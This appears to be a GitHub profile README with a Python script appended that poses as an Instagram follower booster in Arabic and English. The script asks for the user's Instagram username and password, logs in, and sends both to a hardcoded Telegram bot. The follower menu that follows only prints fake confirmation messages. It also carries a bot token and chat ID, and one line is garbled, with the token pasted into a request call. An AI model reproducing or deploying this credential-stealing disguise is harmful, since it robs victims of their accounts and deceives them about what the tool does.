- 👋 Hi, I’m @qweqwe114
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
qweqwe114/qweqwe114 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import requests, random, requests, json, pyfiglet,sys,time, os, uuid
Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format(" *JAMAL *")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
password = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Password  :  '+faB_s)
print('  ')
url_login = 'https://www.instagram.com/accounts/login/ajax/'
headers_login = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '291',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=5281960666:AAEaoU3vw8JmhHMOVG7330BU0AxQ685kCAU',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1cb44f68ffec',
    'x-requested-with': 'XMLHttpRequest'
}
data_login = {
    'username': username,
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password}',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
}
req_login = requests.post(url_login,5281960666:AAEaoU3vw8JmhHMOVG7330BU0AxQ685kCAU data=data_login, headers=headers_login)
if '"authenticated":false' in req_login.text:
    print(''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Username or Password Is Error Try Agin . \n ⌯ اسم الستخدم او الباسورد خطأ اعد مره اخرۍ .')
    exit(0)
elif '"authenticated":true' in req_login.text:
    print(''+Ba_bS+'('+a_aB_s+'√'+S_aBs+')'+Ba_bS+'  ⌯ Done Login . \n ⌯ تم تسجيل الدخول بنجاح .')
os.system("clear")		
print(a_bSa+ab)
ID = '1894309074'
token = '5293943492:AAHaW3TXbE_gpCFuQaYzAaxDtwIvUOsoEHI'
t = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= new account 🦇 ︎\n.User : [ → {username} ← ]\n.Pass : [ → {password} ← ]\n- CH : @JJAAMMAALLL - PY : @JAMA_700L ")
slow(S_aBs+''' 
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦  
⌯  [ 6 ] - 20k   ⇦  
   \n''')
Abs = input (''+Ba_bS+'  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  '+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 3000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   ')
if (Abs == '2'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests 💞💞.   ')
if (Abs == '3'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests 💞💞.   ')
if (Abs == '4'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests 💞💞.   ')
if (Abs == '5'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests 💞💞.   ')
if (Abs == '6'):
	print(Ba_bS+'\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب 💞💞\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests 💞💞.   ') 
